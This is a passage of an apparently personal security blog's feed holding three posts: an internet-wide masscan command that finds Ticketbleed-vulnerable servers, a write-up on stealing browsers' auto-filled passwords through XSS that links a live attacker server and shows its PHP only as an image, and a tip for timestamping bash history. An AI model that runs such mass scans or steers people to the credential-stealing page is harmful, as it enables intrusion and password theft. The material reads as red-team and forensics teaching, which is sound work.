&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;/bin/masscan 0.0.0./0 &lt;span class=&quot;nt&quot;&gt;-p443&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--source-ip&lt;/span&gt; xxx.xxx.xxx.xx - xxx.xxx.xxx.xx &lt;span class=&quot;nt&quot;&gt;--rate&lt;/span&gt; 250000 &lt;span class=&quot;nt&quot;&gt;-oB&lt;/span&gt; ticketbleed &lt;span class=&quot;nt&quot;&gt;--ticketbleed&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h5 id=&quot;terminal-output&quot;&gt;Terminal Output:&lt;/h5&gt;

&lt;figure&gt;
&lt;img src=&quot;https://raw.githubusercontent.com/zer0trustsec/zer0trustsec.github.io/master/_posts/scan-whole-internet-ticketbleed/terminal.png&quot; alt=&quot;Terminal command output&quot; /&gt;
&lt;figcaption&gt; Terminal Command &lt;/figcaption&gt;
&lt;/figure&gt;

&lt;h4 id=&quot;tools-used&quot;&gt;Tools used:&lt;/h4&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/robertdavidgraham/masscan&quot;&gt;Massscan&lt;/a&gt;
&lt;a href=&quot;https://gist.github.com/rayterrill/188409e5e4cec6895d1939e155fbf3ed&quot;&gt;Powershell code&lt;/a&gt;&lt;/p&gt;</content><author><name>Santhosh Baswa</name></author><category term="redteam" /><category term="massscan" /><category term="ticketbleed" /><summary type="html">This post is useful for Red teamers / CyberOps / Penetration testers to use Mass Scan tool to identify the Ticketbleed vulnerable servers in whole internet.</summary></entry><entry><title type="html">Is your saved passwords were safe in browser?</title><link href="http://localhost:4000/stealpasswords-modern-browsers-autofill-privacy/" rel="alternate" type="text/html" title="Is your saved passwords were safe in browser?" /><published>2016-11-24T09:00:00+07:00</published><updated>2016-11-24T09:00:00+07:00</updated><id>http://localhost:4000/stealpasswords-modern-browsers-autofill-privacy</id><content type="html" xml:base="http://localhost:4000/stealpasswords-modern-browsers-autofill-privacy/">&lt;p&gt;In this article, I would like to share the server-side source code for stealing auto-fill saved passwords from modern browsers. It might be useful for Penetration testers or Red Teams.&lt;/p&gt;

&lt;h4 id=&quot;demo-steps&quot;&gt;Demo Steps:&lt;/h4&gt;
&lt;ol&gt;
  &lt;li&gt;User’s should enter the dummy username/password from available form.&lt;/li&gt;
  &lt;li&gt;Save the password in browser&lt;/li&gt;
  &lt;li&gt;XSS code technique will steal password from auto-filled password field.&lt;/li&gt;
&lt;/ol&gt;

&lt;h5 id=&quot;server-side-source-code&quot;&gt;Server side-source code:&lt;/h5&gt;

&lt;figure&gt;
&lt;img src=&quot;https://raw.githubusercontent.com/zer0trustsec/zer0trustsec.github.io/master/_posts/stealpasswords-modern-browsers-autofill-privacy/code.png&quot; alt=&quot;Server-side source code&quot; /&gt;
&lt;figcaption&gt;PHP code&lt;/figcaption&gt;
&lt;/figure&gt;

&lt;h4 id=&quot;demo-website&quot;&gt;Demo Website&lt;/h4&gt;

&lt;p&gt;&lt;a href=&quot;http://133.242.134.241/exploit/password_manager.php&quot;&gt; Public hosted Attacker Server - May takedown in future&lt;/a&gt;&lt;/p&gt;</content><author><name>Santhosh Baswa</name></author><category term="browser" /><category term="access" /><category term="data" /><category term="collection" /><category term="redteam" /><summary type="html">In this article, I would like to share the server-side source code for stealing auto-fill saved passwords from modern browsers. It might be useful for Penetration testers or Red Teams.</summary></entry><entry><title type="html">Security Admin Tip- Enable terminal history logging</title><link href="http://localhost:4000/enable-terminal-history-logging/" rel="alternate" type="text/html" title="Security Admin Tip- Enable terminal history logging" /><published>2016-11-22T07:50:00+07:00</published><updated>2016-11-22T07:50:00+07:00</updated><id>http://localhost:4000/enable-terminal-history-logging</id><content type="html" xml:base="http://localhost:4000/enable-terminal-history-logging/">&lt;p&gt;Most of the times, When i was handling some IR investigations, I found some missing part and important artifacts in Linux machines. As a DFIR investigator, we do timeline analysis and look at malicious command execution history in linux machines.&lt;/p&gt;

&lt;p&gt;But most of the lazy linux administrators were not enabling the history logging with date in linux machines. We don’t see those command logging capabilities in most of the organisations, It will be very challenging for DFIR investigators while handling the incidents.&lt;/p&gt;

&lt;p&gt;I would like to share some quick tip for all lazy linux administrators.&lt;/p&gt;

&lt;h4 id=&quot;bash-command-history-date-logging-configuration&quot;&gt;Bash command history date logging configuration&lt;/h4&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'export HISTTIMEFORMAT=&quot;%d/%m/%y %T &quot;'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; ~/.bash_profile
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; ~/.bash_profile
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;source&lt;/span&gt; ~/.bash_profile
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;history&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>Santhosh Baswa</name></author><category term="linux" /><category term="admin" /><category term="history" /><summary type="html">Most of the times, When i was handling some IR investigations, I found some missing part and important artifacts in Linux machines. As a DFIR investigator, we do timeline analysis and look at malicious command execution history in linux machines.</summary></entry></feed>